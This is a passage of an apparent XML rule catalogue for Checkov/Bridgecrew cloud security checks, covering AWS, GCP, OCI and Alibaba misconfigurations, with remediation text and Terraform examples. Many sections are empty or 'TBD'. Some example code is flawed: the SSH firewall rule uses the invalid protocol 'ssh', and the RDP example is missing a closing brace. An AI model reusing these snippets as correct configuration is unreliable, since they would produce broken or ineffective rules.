<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies App Flow flow which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your App Flow flow data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_appflow_flow" "pass" {
  name = "example"

  source_flow_config {
    connector_type = "S3"
    source_connector_properties {
      s3 {
        bucket_name   = aws_s3_bucket_policy.example_source.bucket
        bucket_prefix = "example"
      }
    }
  }

  destination_flow_config {
    connector_type = "S3"
    destination_connector_properties {
      s3 {
        bucket_name = aws_s3_bucket_policy.example_destination.bucket

        s3_output_format_config {
          prefix_config {
            prefix_type = "PATH"
          }
        }
      }
    }
  }

  task {
    source_fields     = ["exampleField"]
    destination_field = "exampleField"
    task_type         = "Map"

    connector_operator {
      s3 = "NO_OP"
    }
  }

  kms_arn = aws_kms_key.example.arn

  trigger_config {
    trigger_type = "OnDemand"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-app-flow-flow-uses-customer-managed-keys-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-app-flow-flow-uses-customer-managed-keys-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-app-flow-flow-uses-customer-managed-keys-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_195</key>
    <name>Ensure AWS Glue component is associated with a security configuration</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-glue-component-is-not-associated-with-a-security-configuration"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-glue-component-is-not-associated-with-a-security-configuration"></div>AWS Glue component is not associated with a security configuration</div><a aria-label="Skip link to AWS Glue component is not associated with a security configuration" class="heading-anchor-icon fa fa-anchor" href="#aws-glue-component-is-not-associated-with-a-security-configuration"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-glue-component-is-associated-with-a-security-configuration' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-glue-component-is-associated-with-a-security-configuration</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-glue-component-is-associated-with-a-security-configuration' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_218</key>
    <name>Ensure AWS Cloudsearch uses the latest (Transport Layer Security) TLS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudsearch-does-not-use-the-latest-transport-layer-security-tls"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloudsearch-does-not-use-the-latest-transport-layer-security-tls"></div>AWS Cloudsearch does not use the latest (Transport Layer Security) TLS</div><a aria-label="Skip link to AWS Cloudsearch does not use the latest (Transport Layer Security) TLS" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudsearch-does-not-use-the-latest-transport-layer-security-tls"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-the-latest-transport-layer-security-tls-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-the-latest-transport-layer-security-tls-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-the-latest-transport-layer-security-tls-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_2</key>
    <name>Ensure GCP Firewall rule does not allow all traffic on SSH port 22</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-firewall-rule-allows-all-traffic-on-ssh-port-22"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-firewall-rule-allows-all-traffic-on-ssh-port-22"></div>GCP Firewall rule allows all traffic on SSH port 22</div><a aria-label="Skip link to GCP Firewall rule allows all traffic on SSH port 22" class="heading-anchor-icon fa fa-anchor" href="#gcp-firewall-rule-allows-all-traffic-on-ssh-port-22"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Firewall rules setup fine-grained allow/deny traffic policies to and from a VM. Enabled rules are always enforced, and help protect instances from unwanted traffic. Firewall rules are defined at the network level, and only apply to the network where they are created. </p>
<p>Every VPC functions as a distributed firewall. While firewall rules are defined at the network level, connections are allowed or denied on a per-instance basis. A default network is pre-populated with firewall rules that allow incoming traffic to instances. The <strong>default-allow-ssh</strong> rule permits ingress connections on TCP port 22 from any source to any instance in the network. </p>
<p>We recommend you restrict or remove the <strong>default-allow-ssh</strong> rule when you no longer need it.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<ol>
<li>List your firewall rules. You can view a list of all rules or just those in a particular network.</li>
<li>Click the rule <strong>default-allow-ssh</strong>.</li>
<li>Click <strong>Delete</strong>.</li>
<li>Click<strong> Delete</strong> again to confirm.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute firewall-rules delete default-allow-ssh</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_firewall</li>
<li><strong>Argument</strong>: deny. The deny block supports:<br/>
<strong>protocol</strong> (Required)<br/>
The IP protocol to which this rule applies. The protocol type is required when creating a firewall rule. This value can either be one of the following well known protocol strings (tcp, udp, icmp, esp, ah, sctp, ipip), or the IP protocol number.<br/>
<strong>ports</strong> (Optional)<br/>
An optional list of ports to which this rule applies. This field is only applicable for UDP or TCP protocol. Each entry must be either an integer or a range. If not specified, this rule applies to connections through any port. Example inputs include: ["22"], ["80","443"], and ["12345-12349"].</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_firewall" "default" {
  name    = "test-firewall"
  network = google_compute_network.default.name

  allow {
    protocol = "icmp"
  }

  deny {
    protocol = "ssh"
    ports    = ["22"]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_3</key>
    <name>Ensure GCP Firewall rule does not allow all traffic on RDP port 3389</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-firewall-rule-allows-all-traffic-on-rdp-port-3389"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-firewall-rule-allows-all-traffic-on-rdp-port-3389"></div>GCP Firewall rule allows all traffic on RDP port 3389</div><a aria-label="Skip link to GCP Firewall rule allows all traffic on RDP port 3389" class="heading-anchor-icon fa fa-anchor" href="#gcp-firewall-rule-allows-all-traffic-on-rdp-port-3389"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Firewall rules setup fine grained allow/deny traffic policies to and from a virtual machine (VM). Enabled rules are always enforced, and help protecting instances from unwanted traffic. Firewall rules are defined at the network level, and only apply to the network where they are created. </p>
<p>Every VPC functions as a distributed firewall. While firewall rules are defined at the network level, connections are allowed or denied on a per-instance basis. A default network is pre-populated with firewall rules that allow incoming traffic to instances. The <strong>default-allow-rdp</strong> rule permits ingress connections on TCP port 3389 from any source to any instance in the network. </p>
<p>We recommend you restrict or remove the <strong>default-allow-rdp</strong> rule when you no longer need it.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<ol>
<li>List your firewall rules. You can view a list of all rules or just those in a particular network.</li>
<li>Click the rule "default-allow-rdp" to delete.</li>
<li>Click Delete.</li>
<li>Click Delete again to confirm.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute firewall-rules delete default-allow-rdp</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_firewall</li>
<li><strong>Argument</strong>: deny. The deny block supports:<br/>
<strong>protocol</strong> (Required) The IP protocol to which this rule applies. The protocol type is required when creating a firewall rule. This value can either be one of the following well known protocol strings (tcp, udp, icmp, esp, ah, sctp, ipip), or the IP protocol number.<br/>
<strong>ports</strong> (Optional) An optional list of ports to which this rule applies. This field is only applicable for UDP or TCP protocol. Each entry must be either an integer or a range. If not specified, this rule applies to connections through any port. Example inputs include: ["22"], ["80","443"], and ["12345-12349"].</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_firewall" "default" {
  name    = "test-firewall"
  network = google_compute_network.default.name

  allow {
    protocol = "icmp"
  }

  deny {
    protocol = "tcp"
    ports    = ["3389"]
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_30</key>
    <name>Codecov API key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="codecov-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-codecov-api-key"></div>Codecov API key</div><a aria-label="Skip link to Codecov API key" class="heading-anchor-icon fa fa-anchor" href="#codecov-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Codecov is a tool that is used to measure the test coverage of your codebase. It generally calculates the coverage ratio by examining which lines of code were executed while running the unit tests. When linking a GitHub account to Codecov, the service can be restricted to public repositories only, or be allowed to access private repositories as well.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_30' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_30</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_30' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_1</key>
    <name>Ensure no hard coded OCI private key in provider</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-private-keys-are-hard-coded-in-the-provider"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-private-keys-are-hard-coded-in-the-provider"></div>OCI private keys are hard coded in the provider</div><a aria-label="Skip link to OCI private keys are hard coded in the provider" class="heading-anchor-icon fa fa-anchor" href="#oci-private-keys-are-hard-coded-in-the-provider"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When accessing OCI programmatically, users can use a password protected certificate. Including that password in your files that are checked into a repository leaves you exposed to account hijacking.</p>
<p>We recommend using a secrets store or security tokens for secure access.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">provider "oci" {
-  private_key_password = "secretPassword"  
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_oci_secrets_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_oci_secrets_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_oci_secrets_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_243</key>
    <name>Ensure AWS MWAA environment has worker logs enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-mwaa-environment-has-worker-logs-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-mwaa-environment-has-worker-logs-disabled"></div>AWS MWAA environment has worker logs disabled</div><a aria-label="Skip link to AWS MWAA environment has worker logs disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-mwaa-environment-has-worker-logs-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-worker-logs-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-worker-logs-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-worker-logs-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_238</key>
    <name>Ensure AWS GuardDuty detector is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-guardduty-detector-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-guard-duty-detector-is-enabled"></div>AWS GuardDuty detector is enabled</div><a aria-label="Skip link to AWS GuardDuty detector is enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-guardduty-detector-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-guardduty-detector-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-guardduty-detector-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-guardduty-detector-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_29</key>
    <name>Ensure Alibaba cloud ALB ACL restricts public access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-alb-acl-does-not-restrict-public-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-alb-acl-does-not-restrict-public-access"></div>Alibaba cloud ALB ACL does not restrict public access</div><a aria-label="Skip link to Alibaba cloud ALB ACL does not restrict public access" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-alb-acl-does-not-restrict-public-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-alb-acl-restricts-public-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-alb-acl-restricts-public-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-alb-acl-restricts-public-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_92</key>
    <name>Ensure GCP Vertex AI datasets use a Customer Manager Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-vertex-ai-datasets-do-not-use-a-customer-manager-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-vertex-ai-datasets-do-not-use-a-customer-manager-key-cmk"></div>GCP Vertex AI datasets do not use a Customer Manager Key (CMK) </div><a aria-label="Skip link to GCP Vertex AI datasets do not use a Customer Manager Key (CMK) " class="heading-anchor-icon fa fa-anchor" href="#gcp-vertex-ai-datasets-do-not-use-a-customer-manager-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Vertex AI datasets which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Vertex AI datasets data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_vertex_ai_dataset</li>
<li><strong>Arguments</strong>:  region.encryption_spec.kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_vertex_ai_dataset" "pass" {
  display_name        = "terraform"
  metadata_schema_uri = "gs://google-cloud-aiplatform/schema/dataset/metadata/image_1.0.0.yaml"
  region              = "us-central1"
     encryption_spec {
       kms_key_name=google_kms_crypto_key.example.name
     }

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-datasets-use-a-customer-manager-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-datasets-use-a-customer-manager-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-vertex-ai-datasets-use-a-customer-manager-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_4</key>
    <name>Ensure GCP HTTPS load balancer is not configured with SSL policy having TLS version 1.1 or lower</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-https-load-balancer-is-configured-with-ssl-policy-having-tls-version-11-or-lower"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-https-load-balancer-is-configured-with-ssl-policy-having-tls-version-1-1-or-lower"></div>GCP HTTPS load balancer is configured with SSL policy having TLS version 1.1 or lower</div><a aria-label="Skip link to GCP HTTPS load balancer is configured with SSL policy having TLS version 1.1 or lower" class="heading-anchor-icon fa fa-anchor" href="#gcp-https-load-balancer-is-configured-with-ssl-policy-having-tls-version-11-or-lower"></a></h1>
